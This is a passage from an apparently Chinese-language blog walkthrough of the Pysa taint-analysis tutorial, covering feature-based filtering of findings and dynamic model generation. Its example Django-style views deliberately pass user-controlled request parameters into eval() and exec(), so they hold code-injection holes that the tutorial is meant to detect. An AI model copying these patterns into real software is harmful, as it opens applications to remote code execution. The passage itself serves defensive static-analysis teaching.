class="title">assert_numeric</span>(<span class="params">operand: <span class="built_in">str</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> operand.isnumeric()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_and</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    left = <span class="built_in">bool</span>(request.GET[<span class="string">&quot;left&quot;</span>])</span><br><span class="line">    right = <span class="built_in">bool</span>(request.GET[<span class="string">&quot;right&quot;</span>])</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;left&#125;</span> and <span class="subst">&#123;right&#125;</span>&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_or</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    left = request.GET[<span class="string">&quot;left&quot;</span>]</span><br><span class="line">    right = request.GET[<span class="string">&quot;right&quot;</span>]</span><br><span class="line">    assert_numeric(left)</span><br><span class="line">    assert_numeric(right)</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;left&#125;</span> or <span class="subst">&#123;right&#125;</span>&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config ç‰¹å¾ï¼ˆfeatureï¼‰æ˜¯ä¸æ±¡ç‚¹æµç›¸å…³çš„é™„åŠ å…ƒæ•°æ®ï¼Œå¯ç”¨äºè¿‡æ»¤è¯¯æŠ¥ï¼ˆä¸å½±å“åˆ†æï¼‰ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;example&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;Copy this feature and write your own. Don&#x27;t forget that JSON lists are comma seperated!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>features.pysa ä½¿ç”¨äº†åç§°ä¸º example çš„ç‰¹å¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.example_feature(argument: AddFeatureToArgument[Via[example]]): ...</span><br></pre></td></tr></table></figure><p>è¿è¡Œ Pysa å¹¶åœ¨ SAPP ä¸­æ‰“å¼€ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyre analyze --no-verify --save-results-to .</span><br><span class="line">sapp analyze taint-output.json</span><br><span class="line">sapp explore</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ SAPP äº¤äº’å¼å‘½ä»¤è¡ŒæŸ¥çœ‹å®‰å…¨é—®é¢˜ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; issues <span class="comment"># è¿”å› 2 ä¸ªé—®é¢˜</span></span><br><span class="line">Issue 1</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  has:first-index</span><br><span class="line">                  first-index:left</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Issue 2</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_and</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-type:bool</span><br><span class="line">                  always-type:scalar</span><br><span class="line">                  always-via:obscure</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:21|18|39</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 2 issues with run_id 1.</span><br><span class="line"></span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>]) <span class="comment"># è¿‡æ»¤ do_and</span></span><br><span class="line">Issue 1</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  has:first-index</span><br><span class="line">                  first-index:left</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 1 issues with run_id 1.</span><br><span class="line"></span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span> <span class="comment"># é€€å‡º</span></span><br><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise4$</span><br></pre></td></tr></table></figure><p>åœ¨ taint.config ä¸­æ·»åŠ åç§°ä¸º assert_numeric çš„ç‰¹å¾ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;example&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;Copy this feature and write your own. Don&#x27;t forget that JSON lists are comma seperated!&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;assert_numeric&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;via assert_numeric&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ features.pysa ä¸­ä½¿ç”¨è¯¥ç‰¹å¾ï¼ŒæŒ‡æ˜ views.assert_numeric å‡½æ•°çš„ operand å‚æ•°å¸¦æœ‰è¯¥ç‰¹å¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.assert_numeric(operand: AddFeatureToArgument[Via[assert_numeric]]): ...</span><br></pre></td></tr></table></figure><p>é‡æ–°è¿è¡Œ Pysa å¹¶åœ¨ SAPP ä¸­æ‰“å¼€ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyre analyze --no-verify --save-results-to .</span><br><span class="line">sapp analyze taint-output.json</span><br><span class="line">sapp explore</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ–°çš„ç‰¹å¾ï¼Œä½¿ç”¨ä¸¤ä¸ªç‰¹å¾è¿‡æ»¤ï¼Œè¿”å› 0 ä¸ªå®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues</span><br><span class="line">Issue 3</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-via:assert_numeric  <span class="comment"># æ–°ç‰¹å¾</span></span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Issue 4</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_and</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  always-via:obscure</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-type:scalar</span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">                  always-type:bool</span><br><span class="line">        Location: views.py:21|18|39</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 2 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>]) <span class="comment"># è¿‡æ»¤ do_and</span></span><br><span class="line">Issue 3</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-via:assert_numeric</span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 1 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>, <span class="string">&quot;always-via:assert_numeric&quot;</span>]) <span class="comment"># è¿‡æ»¤ do_andã€do_or</span></span><br><span class="line"></span><br><span class="line">Found 0 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span></span><br><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise4$</span><br></pre></td></tr></table></figure><h2 id="exercise5"><a href="#exercise5" class="headerlink" title="exercise5"></a>exercise5</h2><p>åŠ¨æ€æ¨¡å‹ç”Ÿæˆå™¨åœ¨ Pysa ä¹‹å‰è¿è¡Œï¼Œèƒ½å¤Ÿç”Ÿæˆ <code>.pysa</code> æ–‡ä»¶ã€‚å®˜æ–¹ä»“åº“ <a href="https://github.com/facebook/pyre-check/tree/master/tools/generate_taint_models">pyre-check/tools/generate_taint_models/get_*.py</a> ä¸­åŒ…å«äº†ç”Ÿæˆå™¨ï¼Œè¯´æ˜æ–‡æ¡£è§ <a href="https://pyre-check.org/docs/pysa-model-generators/">Dynamically Generating Models</a>ã€‚</p><p>ç›´æ¥è¿è¡Œ <code>pyre analyze --no-verify</code> æ²¡æœ‰æ£€æµ‹å‡ºå®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[]</span></span><br></pre></td></tr></table></figure><p>views.py å’Œ urls.py æ¨¡ä»¿ Django å¤„ç†è¯·æ±‚çš„é€»è¾‘ã€‚views.py ä¸¤ä¸ªå‡½æ•°éƒ½å­˜åœ¨ RCE æ¼æ´ï¼Œä½† Pysa äº§ç”Ÿäº†æ¼æŠ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Callable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">api_wrapper</span>(<span class="params">func: Callable</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">request</span>):</span></span><br><span class="line">        func(request, **request.GET)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request, operator: <span class="built_in">str</span></span>):</span></span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="meta">@api_wrapper</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request, operator: <span class="built_in">str</span></span>):</span></span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> views <span class="keyword">import</span> operate_on_twos</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlPattern</span>:</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line">    callback: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [UrlPattern(<span class="string">r&quot;^operate_on_twos/(.*)&quot;</span>, operate_on_twos)]</span><br></pre></td></tr></table></figure><p>generate_models.py èƒ½å¤Ÿä¸º views.py åŠ¨æ€ç”Ÿæˆæ±¡ç‚¹æ³¨é‡Šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> urls <span class="keyword">import</span> UrlPattern</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make sure we&#x27;re able to import dependencies in &#x27;pyre-check&#x27; repo, since they</span></span><br><span class="line"><span class="comment"># are not currently in the PyPI package for pyre-check</span></span><br><span class="line">current_file = Path(__file__).absolute()</span><br><span class="line">sys.path.append(<span class="built_in">str</span>(current_file.parents[<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Work around &#x27;-&#x27; in the name of &#x27;pyre-check&#x27;</span></span><br><span class="line">generate_taint_models = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models&quot;</span></span><br><span class="line">)</span><br><span class="line">view_generator = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models.view_generator&quot;</span></span><br><span class="line">)</span><br><span class="line">generator_specifications = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models.generator_specifications&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ignore</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>() -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="comment"># Here, specify all the generators that you might want to call.</span></span><br><span class="line">    generators = &#123;</span><br><span class="line">        <span class="string">&quot;django_path_params&quot;</span>: generate_taint_models.RESTApiSourceGenerator(</span><br><span class="line">            django_urls=view_generator.DjangoUrls(</span><br><span class="line">                urls_module=<span class="string">&quot;urls&quot;</span>,</span><br><span class="line">                url_pattern_type=UrlPattern,</span><br><span class="line">                url_resolver_type=Ignore,</span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="comment"># &quot;decorator_extracted_params&quot;: generate_taint_models.&lt;GENERATOR_NAME&gt;(</span></span><br><span class="line">        <span class="comment">#     root=&quot;.&quot;,</span></span><br><span class="line">        <span class="comment">#     annotation_specifications=[</span></span><br><span class="line">        <span class="comment">#         generate_taint_models.DecoratorAnnotationSpecification(</span></span><br><span class="line">        <span class="comment">#             decorator=&lt;DECORATOR_NAME_INCLUDING_PRECEEDING_@&gt;,</span></span><br><span class="line">        <span class="comment">#             annotations=generator_specifications.default_entrypoint_taint,</span></span><br><span class="line">        <span class="comment">#         )</span></span><br><span class="line">        <span class="comment">#     ],</span></span><br><span class="line">        <span class="comment"># ),</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># The `run_generators` function will take care of parsing command-line arguments, as</span></span><br><span class="line">    <span class="comment"># well as executing the generators specified in `default_modes` unless you pass in a</span></span><br><span class="line">    <span class="comment"># specific set from the command line.</span></span><br><span class="line">    generate_taint_models.run_generators(</span><br><span class="line">        generators,</span><br><span class="line">        default_modes=[</span><br><span class="line">            <span class="string">&quot;django_path_params&quot;</span>,</span><br><span class="line">            <span class="comment"># &quot;decorator_extracted_params&quot;</span></span><br><span class="line">        ],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ generate_models.py åŠ¨æ€ç”Ÿæˆ <code>.pysa</code> æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate_models.py --output-directory .</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>æŠ¥é”™ graphql3 æ¨¡å—æ²¡æœ‰æ‰¾åˆ°ï¼Œå°†æ–‡ä»¶ä¸­çš„ <code>graphql3</code> æ”¹ä¸º <code>graphql</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /home/jck/pyre-check/tools/generate_taint_models/get_dynamic_graphql_sources.py</span><br><span class="line"><span class="comment"># from graphql import GraphQLSchema</span></span><br></pre></td></tr></table></figure></div><p>é‡æ–°æ‰§è¡ŒæˆåŠŸï¼Œè¾“å‡ºå¦‚ä¸‹ï¼Œç”Ÿæˆ generated_django_path_params.pysa é…ç½®æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise5$ python generate_models.py --output-directory .</span><br><span class="line">2021-07-07 03:24:56 INFO Computing models <span class="keyword">for</span> `django_path_params`</span><br><span class="line">2021-07-07 03:24:56 INFO Getting all URLs from `urls`</span><br><span class="line">2021-07-07 03:24:56 INFO Computed models <span class="keyword">for</span> `django_path_params` <span class="keyword">in</span> 0.000 seconds.</span><br><span class="line">&#123;<span class="string">&quot;number of generated models&quot;</span>: 1&#125;</span><br></pre></td></tr></table></figure><p>generated_django_path_params.pysa ä¸­æŒ‡æ˜äº†ä½¿ç”¨æ±¡ç‚¹æºç‚¹å’Œæ±‡ç‚¹çš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.operate_on_twos(request: TaintSource[UserControlled], operator: TaintSource[UserControlled]) -&gt; TaintSink[ReturnedToUser]: ...</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ <code>pyre analyze --no-verify</code>ï¼Œå¾—åˆ° 1 ä¸ªå®‰å…¨é—®é¢˜ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ä»ç„¶æ¼æŠ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>æ‰©å±• generate_models.py è¯†åˆ«è£…é¥°å™¨ï¼Œä½¿ç”¨æ³¨é‡Šçš„å†…å®¹ï¼Œåªéœ€è¦å¡«å…¥ä¸¤é¡¹ï¼ˆç”Ÿæˆå™¨å¯ä»¥åœ¨ <a href="https://pyre-check.org/docs/pysa-model-generators/#example-model-generators">Example Model Generators</a> é‡Œæ‰¾ï¼‰ï¼š</p><ul><li><code>&lt;GENERATOR_NAME&gt;</code>ï¼š<code>AnnotatedFreeFunctionWithDecoratorGenerator</code></li><li><code>&lt;DECORATOR_NAME_INCLUDING_PRECEEDING_@&gt;</code>ï¼š<code>&quot;@api_wrapper&quot;</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 